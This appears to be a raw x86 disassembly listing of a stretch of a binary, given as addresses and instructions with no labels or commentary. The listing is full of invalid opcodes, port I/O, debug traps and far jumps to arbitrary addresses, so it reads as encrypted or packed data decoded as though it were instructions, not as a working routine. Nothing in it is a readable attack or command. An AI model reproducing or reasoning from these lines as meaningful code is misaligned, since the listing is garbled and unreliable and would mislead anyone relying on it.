  4175e8:	rol    esi,cl
  4175ea:	fdivrp st(4),st
  4175ec:	xchg   edi,eax
  4175ed:	out    0x5,eax
  4175ef:	and    al,0x72
  4175f1:	xor    al,BYTE PTR [esi+0x6c4e8c72]
  4175f7:	add    BYTE PTR [edx],0x27
  4175fa:	out    dx,al
  4175fb:	ja     0x417602
  4175fd:	sahf   
  4175fe:	jae    0x417648
  417600:	inc    ebx
  417601:	cmp    ecx,DWORD PTR [esi]
  417603:	xchg   edi,eax
  417604:	xchg   DWORD PTR [ebp+0x60],ecx
  417607:	mov    ch,0x36
  417609:	adc    eax,0x116c2593
  41760e:	jmp    0x921c:0x47e0f665
  417615:	mov    ?,WORD PTR [ebx-0xd]
  417618:	out    0xda,al
  41761a:	retf   
  41761b:	(bad)  
  41761c:	aad    0xcf
  41761e:	inc    edi
  41761f:	fs xchg edx,eax
  417621:	pop    ecx
  417622:	loope  0x417611
  417624:	push   es
  417625:	fwait
  417626:	jg     0x41763e
  417628:	pop    edx
  417629:	mov    al,ds:0x5a656538
  41762e:	mov    esi,0x9ec8d601
  417633:	inc    esp
  417634:	es ins BYTE PTR es:[edi],dx
  417636:	mov    dh,0x2a
  417638:	addr16 inc ebx
  41763a:	push   esp
  41763b:	sahf   
  41763c:	and    bl,BYTE PTR [edx+0x135c069e]
  417642:	jle    0x417664
  417644:	push   ebx
  417645:	mov    esi,0xb5c265a
  41764a:	cmp    bl,ah
  41764c:	pushf  
  41764d:	sbb    eax,0xb5b1b340
  417652:	mov    al,ds:0x4a0f6408
  417657:	or     BYTE PTR [ebp+ecx*4+0x56],bl
  41765b:	xor    DWORD PTR [ebp+0x43],eax
  41765e:	jecxz  0x417600
  417660:	xlat   BYTE PTR ds:[ebx]
  417661:	xchg   esi,eax
  417662:	jge    0x4176b2
  417664:	inc    edx
  417665:	icebp  
  417666:	dec    ebx
  417667:	mov    edi,0x6c1e45b1
  41766c:	repnz push ds
  41766e:	mov    dh,dh
  417670:	cmp    eax,0xc19ecc4
  417675:	jmp    0x9f6e1455
  41767a:	add    al,0x56
  41767c:	lods   al,BYTE PTR ds:[esi]
  41767d:	inc    eax
  41767e:	lds    ebx,FWORD PTR [ebx-0x747d187c]
  417684:	aas    
  417685:	stos   BYTE PTR es:[edi],al
  417686:	repnz (bad) 
  417688:	arpl   WORD PTR [eax-0xc1dbc34],dx
  41768e:	xchg   edi,eax
  41768f:	push   0x76
  417691:	cmp    ah,BYTE PTR [ebx+0x188a30d]
  417697:	xor    esi,DWORD PTR [esi-0x35]
  41769a:	pop    edx
  41769b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41769c:	in     eax,dx
  41769d:	adc    ecx,ebp
  41769f:	xor    ebp,DWORD PTR [ebx+edi*1+0xe]
  4176a3:	xchg   esp,eax
  4176a4:	sbb    BYTE PTR [ebx],ah
  4176a6:	or     esi,eax
  4176a8:	sub    dh,bh
  4176aa:	mov    dl,dh
  4176ac:	dec    ax
  4176ae:	mov    al,ds:0xa68fedff
  4176b3:	push   ebp
  4176b4:	fbstp  TBYTE PTR [ebx-0x71044a47]
  4176ba:	mov    ds:0x87988dd0,al
  4176bf:	cs stos DWORD PTR es:[edi],eax
  4176c1:	dec    edx
  4176c2:	mov    eax,ds:0x4fbfb253
  4176c7:	adc    ch,dl
  4176c9:	push   edi
  4176ca:	aad    0xb8
  4176cc:	dec    ebx
  4176cd:	xor    edx,DWORD PTR [ebp+0x26]
  4176d0:	push   es
  4176d1:	push   cs
  4176d2:	rcr    BYTE PTR [edx+0x281285bd],1
  4176d8:	imul   esp,DWORD PTR [eax+0x7b],0x46
  4176dc:	adc    eax,0x7ed6bf8e
  4176e1:	push   esi
  4176e2:	in     al,0xdf
  4176e4:	call   0xa7cd46e5
  4176e9:	pop    edi
  4176ea:	and    edx,eax
  4176ec:	fidiv  DWORD PTR [ebx-0xa]
  4176ef:	sti    
  4176f0:	and    ecx,esp
  4176f2:	push   ds
  4176f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176f4:	fist   DWORD PTR [eax+esi*4-0x54c13012]
  4176fb:	fldenv [eax*1+0x2f501410]
  417702:	out    0x85,eax
  417704:	lds    ecx,FWORD PTR [eax+0x10]
  417707:	cmp    DWORD PTR [edx-0x7d],edi
  41770a:	jmp    0x9135c4af
  41770f:	shr    DWORD PTR [eax],0x3a
  417712:	icebp  
  417713:	test   DWORD PTR [esi-0x5c0a3748],esi
  417719:	inc    esp
  41771a:	mov    eax,0x4197804d
  41771f:	test   al,0x34
  417721:	dec    edx
  417722:	pusha  
  417723:	push   edi
  417724:	and    al,0x24
  417726:	rol    DWORD PTR [eax-0x38],1
  417729:	add    BYTE PTR [edi+eiz*2],bh
  41772c:	sub    al,0xd3
  41772e:	out    0xef,al
  417730:	lds    esi,FWORD PTR [eax]
  417732:	mov    DWORD PTR [ebx-0xf161a70],eax
  417738:	repz lahf 
  41773a:	test   DWORD PTR [esi-0x6dbb65f],esi
  417740:	push   0x19cfba3f
  417745:	int3   
  417746:	add    edx,DWORD PTR [edi]
  417748:	test   ch,0x82
  41774b:	add    ebp,ecx
  41774d:	push   0x6a
  41774f:	push   ebp
  417750:	mov    edx,0x6457e5e1
  417755:	push   ss
  417756:	inc    esi
  417757:	rol    BYTE PTR ds:[esi+0x6f],1
  41775b:	ret    
  41775c:	aaa    
  41775d:	mov    al,ds:0x92892a85
  417762:	jns    0x4177ce
  417764:	pop    ds
  417765:	push   esp
  417766:	jge    0x4177bd
  417768:	dec    edi
  417769:	xchg   esi,eax
  41776a:	fst    DWORD PTR [edi]
  41776c:	daa    
  41776d:	jmp    0x41773e
  41776f:	jge    0x417774
  417771:	and    DWORD PTR [ebp+0x12],esi
  417774:	loopne 0x41777a
  417776:	pop    edi
  417777:	(bad)  
  417778:	push   ebx
  417779:	mov    bh,0x3c
  41777b:	jg     0x41772c
  41777d:	xchg   esi,eax
  41777e:	es xor ecx,ecx
  417781:	out    dx,eax
  417782:	or     DWORD PTR [eax+0x2d8695cb],ebx
  417788:	es dec ecx
  41778a:	mov    ds:0x57668e42,al
  41778f:	sbb    esp,ebx
  417791:	xor    esi,DWORD PTR [eax]
  417793:	mov    edx,0x3993a84c
  417798:	push   es
  417799:	xor    DWORD PTR [edx+0x35],edx
  41779c:	(bad)  
  41779d:	lds    ebp,FWORD PTR [edx-0x4d8f76b8]
  4177a3:	mov    dh,0x66
  4177a5:	push   ds
  4177a6:	xchg   edi,eax
  4177a7:	dec    ecx
  4177a8:	jb     0x41780b
  4177aa:	das    
  4177ab:	and    al,0xe3
  4177ad:	das    
  4177ae:	jp     0x4177ea
  4177b0:	pop    edi
  4177b1:	dec    ebp
  4177b2:	cmp    BYTE PTR [ecx+eax*4+0x32],cl
  4177b6:	adc    DWORD PTR [eax],eax
  4177b8:	and    dh,BYTE PTR [eax+0x3f9ee084]
  4177be:	adc    cl,al
  4177c0:	ins    BYTE PTR es:[edi],dx
  4177c1:	fst    st(7)
  4177c3:	lods   al,BYTE PTR ds:[esi]
  4177c4:	mov    ah,BYTE PTR [esi]
  4177c6:	mov    cl,0x13
  4177c8:	cli    
  4177c9:	call   0xfeee64d5
  4177ce:	cmp    BYTE PTR [ecx+0x14bbfa8f],al
  4177d4:	sti    
  4177d5:	adc    DWORD PTR [edx],edi
  4177d7:	aaa    
  4177d8:	xchg   ecx,eax
  4177d9:	sahf   
  4177da:	and    al,0xc0
  4177dc:	lods   eax,DWORD PTR ds:[esi]
  4177dd:	scas   al,BYTE PTR es:[edi]
  4177de:	or     BYTE PTR [edx+0x4e],bl
  4177e1:	je     0x417780
  4177e3:	pop    ebx
  4177e4:	adc    BYTE PTR [ebx],cl
  4177e6:	push   esp
  4177e7:	xchg   ebp,eax
  4177e8:	push   ebx
  4177e9:	pop    edx
  4177ea:	adc    bh,BYTE PTR [ecx-0x5c]
  4177ed:	xor    DWORD PTR [edi+ebp*8],edi
  4177f0:	xor    BYTE PTR [edi+0x78740b48],0xa1
  4177f7:	push   ebp
  4177f8:	mov    eax,esi
  4177fa:	jge    0x41780b
  4177fc:	push   ebx
  4177fd:	lds    ebx,FWORD PTR [esi-0x6d]
  417800:	xchg   BYTE PTR [esi],ah
  417802:	in     eax,0x2a
  417804:	dec    edx
  417805:	call   0x164e:0x8570b0ac
  41780c:	ja     0x417842
  41780e:	mov    esp,0x3540b93f
  417813:	lock fist DWORD PTR [ebp+0x43]
  417817:	sub    ebx,DWORD PTR [esi+eax*1-0x1607f9f]
  41781e:	fcmove st,st(6)
  417820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417821:	jae    0x417838
  417823:	fsub   DWORD PTR [eax-0x1e5d4cef]
  417829:	fs xchg ebp,eax
  41782b:	mov    al,ds:0xf7423629
  417830:	mov    dh,dh
  417832:	sub    al,0xae
  417834:	out    0xb1,al
  417836:	out    dx,al
  417837:	fwait
  417838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417839:	arpl   WORD PTR [ecx+0x3e],cx
  41783c:	jecxz  0x417843
  41783e:	test   DWORD PTR [ecx+0x15],ebx
  417841:	xor    al,0xe1
  417843:	jne    0x417807
  417845:	dec    ecx
  417846:	sahf   
  417847:	xchg   edx,eax
  417848:	cmp    al,0x2b
  41784a:	inc    edx
  41784b:	inc    ecx
  41784c:	mov    ah,0x9
  41784e:	retf   
  41784f:	sub    eax,0xf29f5cd0
  417854:	mov    cl,0xb7
  417856:	pop    ds
  417857:	int3   
  417858:	mov    eax,0xed8e2895
  41785d:	jp     0x41780a
  41785f:	leave  
  417860:	ror    DWORD PTR [ebp+eiz*2-0x175ecf5c],cl
  417867:	mov    WORD PTR [edx+ebx*2+0x71],?
  41786b:	ss data16 sahf 
  41786e:	stos   DWORD PTR es:[edi],eax
  41786f:	jmp    0xb72b:0xf0e481ae
  417876:	mov    esi,0x885488e3
  41787b:	jo     0x4178ec
  41787d:	xchg   BYTE PTR [ebp-0x24d5c00f],ah
  417883:	jae    0x417829
  417885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417886:	mov    esp,0xa3fe4b1
  41788b:	rcr    DWORD PTR [ecx+0x5f4a63b0],1
  417891:	inc    edx
  417892:	xor    ah,0xe2
  417895:	pop    ecx
  417896:	mov    WORD PTR [ebx],ds
  417898:	aas    
  417899:	lock dec ebp
  41789b:	add    eax,0x939c32a8
  4178a0:	mov    ch,0x8f
  4178a2:	ja     0x41789e
  4178a4:	nop
  4178a5:	bound  sp,DWORD PTR [ecx+ecx*1]
  4178a9:	cmp    eax,0x2fa4be4
  4178ae:	mov    ebp,0x8c038120
  4178b3:	in     al,0x66
  4178b5:	cmp    bh,BYTE PTR [edx-0x5364694b]
  4178bb:	(bad)
  4178be:	pop    ebp
  4178bf:	or     ah,ah
  4178c1:	stc    
  4178c2:	mov    ds:0x72fc4be,eax
  4178c7:	jmp    0xfecb:0x75709a2b
  4178ce:	add    al,BYTE PTR [ebx]
  4178d0:	ud1    ebx,DWORD PTR [eax-0x60]
  4178d4:	jle    0x4178b5
  4178d6:	fcom   DWORD PTR [edi-0x48]
  4178d9:	adc    al,0xbc
  4178db:	test   eax,0x3b5554cf
  4178e0:	xor    DWORD PTR [ebx],0xffffffc4
  4178e3:	mov    ebx,0xfaace6c2
  4178e8:	mov    ds:0x4fce3680,al
  4178ed:	push   esi
  4178ee:	repnz test BYTE PTR [eax],ch
  4178f1:	mov    DWORD PTR [ebp+0x5c49fcd4],ebx
  4178f7:	inc    esp
  4178f8:	pop    edi
  4178f9:	test   BYTE PTR [ebx-0x4c76d1ea],0xe6
  417900:	push   edi
  417901:	inc    ebp
  417902:	mov    cs,WORD PTR [esi]
  417904:	mov    cl,0x8e
  417906:	cmp    ebx,DWORD PTR [ebp+0xcf0a400]
  41790c:	sub    BYTE PTR [edi],ah
  41790e:	jo     0x41793b
  417910:	sbb    eax,0x7c572454
  417915:	call   0x7f7a:0x30620790
  41791c:	mov    ebx,ebx
  41791e:	repz push ds
  417920:	imul   edi,DWORD PTR es:[ecx+edx*4-0x5e],0x88ef65a7
  417929:	retf   0xcef6
  41792c:	scas   eax,DWORD PTR es:[edi]
  41792d:	call   edx
  41792f:	adc    ebp,DWORD PTR [ebx+0x7054382e]
  417935:	mov    edx,DWORD PTR [edx-0x15]
  417938:	pop    eax
  417939:	jmp    0x417972
  41793b:	loopne 0x417912
  41793d:	adc    BYTE PTR [ebx+ebp*8+0x1d],0x42
  417942:	jg     0x4178ee
  417944:	add    bh,BYTE PTR [esi+0x13062ee9]
  41794a:	inc    eax
  41794b:	mov    edi,0xf5bf6bcc
  417950:	out    0xcf,eax
  417952:	sbb    edi,DWORD PTR [edi-0x17bc11e]
  417958:	mov    ebx,DWORD PTR [edx]
  41795a:	inc    esi
  41795b:	xchg   ebp,eax
  41795c:	or     bl,ch
  41795e:	dec    eax
  41795f:	pop    ecx
  417960:	aaa    
  417961:	and    al,0x5c
  417963:	xor    DWORD PTR [ebp-0x6e],edx
  417966:	ins    BYTE PTR es:[edi],dx
  417967:	sbb    ah,BYTE PTR [eax]
  417969:	dec    esp
  41796a:	pop    ds
  41796b:	mul    BYTE PTR [eiz*4-0x56707145]
  417972:	xor    eax,0x47280408
  417977:	rol    eax,cl
  417979:	es leave 
  41797b:	xor    cl,bl
  41797d:	inc    ebp
  41797e:	aam    0x8
  417980:	xchg   esi,eax
  417981:	inc    ecx
  417982:	(bad)  
  417983:	sar    DWORD PTR [edx+0xeb05f83],cl
  417989:	in     al,0xc0
  41798b:	cdq    
  41798c:	pop    edi
  41798d:	call   0x9a05d0
  417992:	int3   
  417993:	adc    ah,0x3a
  417996:	nop
  417997:	mov    edx,DWORD PTR [ebx-0x2a47e3bd]
  41799d:	sub    DWORD PTR [ebx+0x76],0xed8e9e52
  4179a4:	jno    0x4179a4
  4179a6:	push   edi
  4179a7:	and    eax,0xb2047009
  4179ac:	add    DWORD PTR [edx*4+0x3820c599],0xb
  4179b4:	shl    esp,cl
  4179b6:	mov    al,ds:0xb4243b06
  4179bb:	pop    esp
  4179bc:	ret    
  4179bd:	mov    ds:0x4386d6c4,al
  4179c2:	in     al,dx
  4179c3:	(bad)  
  4179c4:	popf   
  4179c5:	cdq    
  4179c6:	data16 jecxz 0x4179a2
  4179c9:	pop    es
  4179ca:	dec    eax
  4179cb:	cmp    cl,BYTE PTR [edi*4-0x5e25552d]
  4179d2:	mov    cl,0xd5
  4179d4:	addr16 popf 
  4179d6:	pop    eax
  4179d7:	xchg   esp,eax
  4179d8:	out    0x49,al
  4179da:	inc    esp
  4179db:	sub    BYTE PTR [edx],dl
  4179dd:	mov    dl,0x48
  4179df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179e0:	jp     0x4179c7
  4179e2:	cmp    dh,BYTE PTR [edx+ecx*2-0x4fbe6bd9]
  4179e9:	xlat   BYTE PTR ds:[ebx]
  4179ea:	pop    ss
  4179eb:	xchg   esi,eax
  4179ec:	not    dl
  4179ee:	sub    DWORD PTR [esi],ecx
  4179f0:	push   DWORD PTR [ecx]
  4179f2:	lahf   
  4179f3:	fimul  WORD PTR [edx+0x7b17e22f]
  4179f9:	sub    ah,BYTE PTR [edi]
  4179fb:	jns    0x417a10
  4179fd:	mov    bh,0xa3
  4179ff:	push   cs
  417a00:	mov    edi,0x6b43834f
  417a05:	pop    edi
  417a06:	and    al,0xd2
  417a08:	mov    dh,0x36
  417a0a:	out    dx,al
  417a0b:	loope  0x417a7b
  417a0d:	fsub   QWORD PTR [edi]
  417a0f:	sub    al,0x27
  417a11:	js     0x4179c4
  417a13:	xor    eax,0xd8b0fb88
  417a18:	add    edi,ecx
  417a1a:	stos   DWORD PTR es:[edi],eax
  417a1b:	mov    esi,0xcd2cf7d0
  417a20:	out    dx,al
  417a21:	sbb    ch,cl
  417a23:	sub    ch,0x50
  417a26:	push   cs
  417a27:	retf   0x57cd
  417a2a:	mov    ebp,DWORD PTR [edi+eax*2]
  417a2d:	(bad)  
  417a2e:	push   ds
  417a2f:	aam    0x1e
  417a31:	add    ebp,esi
  417a33:	mov    ebx,0x80237bb7
  417a38:	dec    ebx
  417a39:	xchg   esi,eax
  417a3a:	jno    0x417a1a
  417a3c:	test   DWORD PTR [eax],0x9db8b79d
  417a42:	pop    edi
  417a43:	sahf   
  417a44:	mov    ds:0x3c35083c,al
  417a49:	or     DWORD PTR [edx-0x6b8ab70f],edx
  417a4f:	pop    ebx
  417a50:	repnz es shr bh,0x7
  417a55:	jb     0x417a38
  417a57:	inc    ebp
  417a58:	xor    eax,0xf89b86b2
  417a5d:	pop    esi
  417a5e:	pop    es
  417a5f:	dec    eax
  417a60:	cs xchg ecx,eax
  417a62:	test   bh,0x7d
  417a65:	icebp  
  417a66:	ins    DWORD PTR es:[edi],dx
  417a67:	sbb    DWORD PTR [ebp-0x3],esp
  417a6a:	pop    ebx
  417a6b:	push   0x36
  417a6d:	mov    dh,0x56
  417a6f:	jbe    0x4179fd
  417a71:	repz jmp 0x417a9c
  417a74:	cmp    edx,DWORD PTR [edi]
  417a76:	in     al,0x14
  417a78:	adc    edi,0x44
  417a7b:	pop    eax
  417a7c:	jnp    0x417aaf
  417a7e:	stos   BYTE PTR es:[edi],al
  417a7f:	enter  0x1ce9,0xda
  417a83:	and    al,0xb0
  417a85:	inc    ebx
  417a86:	jae    0x417a1c
  417a88:	in     eax,dx
  417a89:	xchg   ebx,eax
  417a8a:	mov    bl,0xea
  417a8c:	or     al,0xf0
  417a8e:	inc    esp
  417a8f:	loop   0x417a5e
  417a91:	sub    BYTE PTR [edi-0x44a07527],bl
  417a97:	paddsb mm0,mm2
  417a9a:	call   FWORD PTR ds:0xadbeffaa
  417aa0:	aas    
  417aa1:	arpl   bx,cx
  417aa3:	dec    edx
  417aa4:	enter  0x1974,0x3
  417aa8:	mov    ebp,0x6d9af9bd
  417aad:	and    DWORD PTR [edx-0xcb852e],edi
  417ab3:	inc    ecx
  417ab4:	iret   
  417ab5:	jne    0x417a3f
  417ab7:	stos   BYTE PTR es:[edi],al
  417ab8:	dec    ebp
  417ab9:	sbb    eax,0x7f94bc5d
  417abe:	addr16 xchg ebx,eax
  417ac0:	adc    esp,DWORD PTR [eax]
  417ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ac3:	sbb    BYTE PTR [ebp-0x7ec62f70],dl
  417ac9:	jle    0x417ad3
  417acb:	neg    BYTE PTR [eax+0x75]
  417ace:	cdq    
  417acf:	mov    dl,0xdb
  417ad1:	aaa    
  417ad2:	cmp    dl,BYTE PTR [esi-0x3a7bee0b]
  417ad8:	pop    es
  417ad9:	js     0x417af3
  417adb:	icebp  
  417adc:	push   ds
  417add:	leave  
  417ade:	mov    edi,0xee8a543d
  417ae3:	stc    
  417ae4:	lods   eax,DWORD PTR ds:[esi]
  417ae5:	(bad)  
  417ae6:	(bad)  
  417ae7:	sbb    eax,DWORD PTR [edx+0x27]
  417aea:	stos   DWORD PTR es:[edi],eax
  417aeb:	dec    eax
  417aec:	outs   dx,BYTE PTR ds:[esi]
  417aed:	fstp   QWORD PTR [eax]
  417aef:	call   0x3a84:0xaa273266
  417af6:	push   ds
  417af7:	jnp    0x417b58
  417af9:	mov    bl,0xdb
  417afb:	push   ecx
  417afc:	xor    BYTE PTR [ecx-0x10],0xd8
  417b00:	jmp    0x417a90
  417b02:	cld    
  417b03:	mov    al,ds:0x9027f011
  417b08:	outs   dx,DWORD PTR ds:[esi]
  417b09:	xchg   DWORD PTR [ebx],edi
  417b0b:	in     al,dx
  417b0c:	mov    cl,0x86
  417b0e:	test   al,0xe9
  417b10:	in     eax,dx
  417b11:	sub    DWORD PTR [ebp-0x7],edi
  417b14:	jge    0x417aec
  417b16:	call   0xbb39:0x3f30f3d2
  417b1d:	adc    eax,edx
  417b1f:	pop    es
  417b20:	fistp  DWORD PTR [edx-0x7bd9a6dc]
  417b26:	pop    eax
  417b27:	lahf   
  417b28:	test   al,0x6d
  417b2a:	mov    ah,0xce
  417b2c:	mov    BYTE PTR [ebp-0x1b],ch
  417b2f:	mov    esp,0x7d2ec4df
  417b34:	aam    0x38
  417b36:	les    edi,FWORD PTR [edi+esi*1+0x2ddc2adf]
  417b3d:	xchg   esi,eax
  417b3e:	jl     0x417b05
  417b40:	inc    edi
  417b41:	sub    esp,DWORD PTR [eax]
  417b43:	sbb    BYTE PTR [esi],0x4b
  417b46:	mov    eax,0xb896b0f2
  417b4b:	pop    eax
  417b4c:	xchg   esi,eax
  417b4d:	mov    cl,0x43
  417b4f:	mov    ebx,0x6f948248
  417b54:	dec    ebp
  417b55:	std    
  417b56:	mov    WORD PTR [ebx+eax*4],gs
  417b59:	stc    
  417b5a:	(bad)  
  417b5b:	rol    BYTE PTR [ebx-0x514a6746],cl
  417b61:	dec    esi
  417b62:	nop
  417b63:	js     0x417ba0
  417b65:	in     eax,dx
  417b66:	mov    fs,ebp
  417b68:	sar    ah,1
  417b6a:	popa   
  417b6b:	test   al,0xc4
  417b6d:	scas   eax,DWORD PTR es:[edi]
  417b6e:	retf   0xb2ce
  417b71:	add    al,0x3c
  417b73:	cmp    eax,0xa9369d5c
  417b78:	fs sub eax,0x4042d5fc
  417b7e:	adc    DWORD PTR [edi+ebp*8],0x2340381f
  417b85:	mov    dh,0xe4
  417b87:	xchg   DWORD PTR [ebx+0x2c1b03c8],edi
  417b8d:	imul   esp,edx,0xffffffcf
  417b90:	adc    ebx,DWORD PTR [esi-0x29]
  417b93:	scas   al,BYTE PTR es:[edi]
  417b94:	sub    al,BYTE PTR [eax+ecx*8]
  417b97:	pop    ecx
  417b98:	pop    ebp
  417b99:	not    DWORD PTR [ecx+0x30]
  417b9c:	push   ecx
  417b9d:	or     ebx,esi
  417b9f:	sub    al,0x5d
  417ba1:	arpl   WORD PTR [esp+eiz*4-0x2a2ff8c4],bx
  417ba8:	int3   
  417ba9:	out    0x37,al
  417bab:	push   ebp
  417bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bad:	pop    es
  417bae:	sub    al,0xac
  417bb0:	rcl    BYTE PTR [eax+0x6745bcf8],0x80
  417bb7:	int3   
  417bb8:	inc    ebp
  417bb9:	scas   eax,DWORD PTR es:[edi]
  417bba:	repz fild QWORD PTR [esi+0x29]
  417bbe:	shl    BYTE PTR ds:0xc34fe2ab,cl
  417bc4:	inc    eax
  417bc5:	adc    al,al
  417bc7:	aaa    
  417bc8:	and    bl,BYTE PTR [ebp-0x25]
  417bcb:	sub    ecx,esi
  417bcd:	jle    0x417bac
  417bcf:	aas    
  417bd0:	push   esi
  417bd1:	or     DWORD PTR [edx+0x43],0xffffffc2
  417bd5:	adc    eax,0x6567781f
  417bda:	push   es
  417bdb:	popa   
  417bdc:	(bad)  
  417bdd:	int    0x18
  417bdf:	ret    
  417be0:	dec    esi
  417be1:	push   0xffffffbf
  417be3:	dec    eax
  417be4:	adc    eax,DWORD PTR [ecx]
  417be6:	ret    0xd795
  417be9:	pop    ebp
  417bea:	stos   DWORD PTR es:[edi],eax
  417beb:	(bad)  
  417bec:	adc    eax,0x996045ca
  417bf1:	cli    
  417bf2:	jae    0x417ba0
  417bf4:	ja     0x417c0b
  417bf6:	or     BYTE PTR [edi+ebp*1+0x57],bh
  417bfa:	aad    0x42
  417bfc:	inc    ebx
  417bfd:	inc    edx
  417bfe:	push   eax
  417bff:	lahf   
  417c00:	arpl   si,bx
  417c02:	shl    BYTE PTR [edx+0x26a3c4f8],1
  417c08:	xor    ch,BYTE PTR fs:[ecx-0x15826470]
  417c0f:	jl     0x417bf3
  417c11:	cli    
  417c12:	inc    esi
  417c13:	stc    
  417c14:	outs   dx,BYTE PTR ds:[esi]
  417c15:	ret    
  417c16:	test   eax,0xd91125a4
  417c1b:	push   esp
  417c1c:	inc    edx
  417c1d:	xchg   esp,eax
  417c1e:	jg     0x417c2b
  417c20:	xlat   BYTE PTR ds:[ebx]
  417c21:	retf   
  417c22:	mov    BYTE PTR [esp+esi*2+0x28],ah
  417c26:	call   0xe7d2f704
  417c2b:	pop    eax
  417c2c:	sub    DWORD PTR ds:[ecx+0x4d744fd7],esp
  417c33:	mov    ds:0xea925ec0,eax
  417c38:	dec    edx
  417c39:	rcr    ebx,0x4a
  417c3c:	pusha  
  417c3d:	push   cs
  417c3e:	mov    bh,0x6b
  417c40:	test   al,0xfd
  417c42:	scas   al,BYTE PTR es:[edi]
  417c43:	cmp    BYTE PTR [ebx-0x1311b06f],dl
  417c49:	jg     0x417c5d
  417c4b:	dec    eax
  417c4c:	sti    
  417c4d:	dec    eax
  417c4e:	int3   
  417c4f:	pop    edi
  417c50:	jno    0x417bf0
  417c52:	sbb    dh,ah
  417c54:	int3   
  417c55:	sub    eax,0xd07ca30e
  417c5a:	test   bh,dl
  417c5c:	push   0xfd3cbac7
  417c61:	outs   dx,BYTE PTR ds:[esi]
  417c62:	sub    BYTE PTR [ebp-0x2c2f9c70],dl
  417c68:	add    al,0xff
  417c6a:	hlt    
  417c6b:	fnstenv [ecx-0x22828533]
  417c71:	sahf   
  417c72:	scas   eax,DWORD PTR es:[edi]
  417c73:	aad    0x2e
  417c75:	mov    ebx,DWORD PTR cs:[esi]
  417c78:	sub    cl,bl
  417c7a:	cs xor al,0x1f
  417c7d:	xor    dh,BYTE PTR [edi]
  417c7f:	(bad)  
  417c80:	addr16 popa 
  417c82:	push   eax
  417c83:	cmp    bh,BYTE PTR [esi]
  417c85:	aaa    
  417c86:	lock or al,bh
  417c89:	mov    BYTE PTR [ecx],dh
  417c8b:	jmp    0x8575134e
  417c90:	jg     0x417cd0
  417c92:	inc    esi
  417c93:	dec    esp
  417c94:	mov    ebx,0x58e78b60
  417c99:	cmp    cl,BYTE PTR [ecx+0xb162fc3]
  417c9f:	mov    dh,0x80
  417ca1:	dec    esp
  417ca2:	xchg   edx,eax
  417ca3:	push   es
  417ca4:	dec    ebp
  417ca5:	inc    ebx
  417ca6:	add    ah,dh
  417ca8:	xchg   esi,eax
  417ca9:	fiadd  WORD PTR [eax-0x257d4bec]
  417caf:	js     0x417d07
  417cb1:	and    DWORD PTR [ebx-0x71a96837],ebp
  417cb7:	adc    dl,BYTE PTR [esi+0x6b]
  417cba:	pop    edx
  417cbb:	lea    eax,[eax-0x65]
  417cbe:	sub    bh,BYTE PTR [ebp-0x3e]
  417cc1:	ret    
  417cc2:	cmp    BYTE PTR [esi],al
  417cc4:	inc    ebp
  417cc5:	xor    al,0x58
  417cc7:	dec    esi
  417cc8:	clc    
  417cc9:	adc    eax,0x4a4b64d
  417cce:	and    esi,DWORD PTR [ecx]
  417cd0:	(bad)  
  417cd1:	rol    DWORD PTR [esi],1
  417cd3:	add    eax,0x937f72e
  417cd8:	stc    
  417cd9:	or     BYTE PTR [esi+0x4e37009],cl
  417cdf:	pop    ebx
  417ce0:	jbe    0x417d21
  417ce2:	pop    esp
  417ce3:	jae    0x417c7f
  417ce5:	mov    dh,0x14
  417ce7:	mov    dl,0xe9
  417ce9:	mov    esi,0xcc1920aa
  417cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cef:	push   ds
  417cf0:	not    dl
  417cf2:	xor    bh,ah
  417cf4:	ins    DWORD PTR es:[edi],dx
  417cf5:	dec    edx
  417cf6:	rcl    BYTE PTR [esi+edx*2],cl
  417cf9:	xor    cl,dh
  417cfb:	jmp    0x67152fed
  417d00:	pop    eax
  417d01:	sub    al,0x1a
  417d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d04:	fwait
  417d05:	lds    ecx,FWORD PTR [edi]
  417d07:	sub    cl,BYTE PTR [ecx]
  417d09:	out    0x51,al
  417d0b:	cmp    eax,0xdf73eeea
  417d10:	sub    dl,dh
  417d12:	seto   BYTE PTR [esi]
  417d15:	cmp    bh,BYTE PTR [ebx]
  417d17:	outs   dx,BYTE PTR ds:[esi]
  417d18:	loopne 0x417c9f
  417d1a:	ret    
  417d1b:	mov    esi,0xff914969
  417d20:	add    ebx,ebp
  417d22:	fcom   QWORD PTR [edx]
  417d24:	push   ds
  417d25:	test   al,0x25
  417d27:	icebp  
  417d28:	scas   eax,DWORD PTR es:[edi]
  417d29:	or     dl,dl
  417d2b:	mov    eax,0xafee92b
  417d30:	outs   dx,BYTE PTR ds:[esi]
  417d31:	xchg   ebp,eax
  417d32:	mov    ds,WORD PTR [ecx+0x1f]
  417d35:	adc    ah,dh
  417d37:	mov    ebx,ecx
  417d39:	xor    eax,0xa84bd47b
  417d3e:	aas    
  417d3f:	or     DWORD PTR [ebp+0x692f29f4],esi
  417d45:	dec    ebp
  417d46:	ins    BYTE PTR es:[edi],dx
  417d47:	leave  
  417d48:	test   DWORD PTR [ebp-0x33e95dbb],edi
  417d4e:	xchg   edi,eax
  417d4f:	hlt    
  417d50:	xlat   BYTE PTR fs:[ebx]
  417d52:	lods   al,BYTE PTR ds:[esi]
  417d53:	popa   
  417d54:	(bad)  
  417d55:	shl    DWORD PTR ds:0x90be597c,cl
  417d5b:	mov    dl,0xb8
  417d5d:	xor    al,0x71
  417d5f:	idiv   BYTE PTR [edi+ecx*8]
  417d62:	mov    esp,0xd400a2dc
  417d67:	mov    esi,ds
  417d69:	(bad)  
  417d6a:	rcr    DWORD PTR [ecx+0x60f125f9],1
  417d70:	push   edx
  417d71:	sbb    dh,dl
  417d73:	adc    bl,BYTE PTR [ebx+0x62]
  417d76:	retf   
  417d77:	dec    ecx
  417d78:	mov    al,ds:0x53153492
  417d7d:	ficom  DWORD PTR [eax+0x5c7485d4]
  417d83:	pushf  
  417d84:	inc    esi
  417d85:	xchg   DWORD PTR [edi+0x1e7ea10a],edx
  417d8b:	sbb    DWORD PTR fs:[ebp+edx*8-0x69],edi
